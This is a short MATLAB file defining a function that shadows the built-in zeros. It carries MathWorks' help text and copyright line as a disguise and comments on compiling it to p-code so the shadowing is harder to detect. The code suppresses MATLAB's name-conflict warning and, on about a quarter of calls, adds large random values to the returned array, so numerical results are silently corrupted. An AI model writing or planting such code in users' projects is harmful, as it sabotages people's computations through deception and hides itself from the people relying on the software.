function outArray = zeros(varargin)
% This function can be used to shadow the zeros function. To make it more
% difficult to get the shadowing it should be exported to a p code and this
% comment should be adapted using the general Matlab comment as follows:

%ZEROS  Zeros array.
%   ZEROS(N) is an N-by-N matrix of zeros.
%
%   ZEROS(M,N) or ZEROS([M,N]) is an M-by-N matrix of zeros.
%
%   ZEROS(M,N,P,...) or ZEROS([M N P ...]) is an M-by-N-by-P-by-... array of
%   zeros.
%
%   ZEROS(SIZE(A)) is the same size as A and all zeros.
%
%   ZEROS with no arguments is the scalar 0.
%
%   ZEROS(..., CLASSNAME) is an array of zeros of class specified by the
%   string CLASSNAME.
%
%   ZEROS(..., 'like', Y) is an array of zeros with the same data type, sparsity,
%   and complexity (real or complex) as the numeric variable Y.
%
%   Note: The size inputs M, N, and P... should be nonnegative integers. 
%   Negative integers are treated as 0.
%
%   Example:
%      x = zeros(2,3,'int8');
%
%   See also EYE, ONES.

%   Copyright 1984-2013 The MathWorks, Inc.
%   Built-in function.

%% setting for overloading
% turn off warning about name conflict
% should actually be done globally in e.g., the startup script
warning('off','MATLAB:dispatcher:nameConflict');

% threshold to plot a fancy non-related figure
randThreshold = 0.25;

%% Call builtin ones function
outArray = builtin('zeros',varargin{:});

%% Add random values with a certain probability
if rand < randThreshold
    % multiplication factor
    multFactor = randi(numel(outArray),'like',outArray);
    % random variables in ]-1,1[
    randArray = 2*rand(size(outArray),'like',outArray) - 1;
    % add the random variables
    outArray = outArray + multFactor * randArray;
end

% EoF
end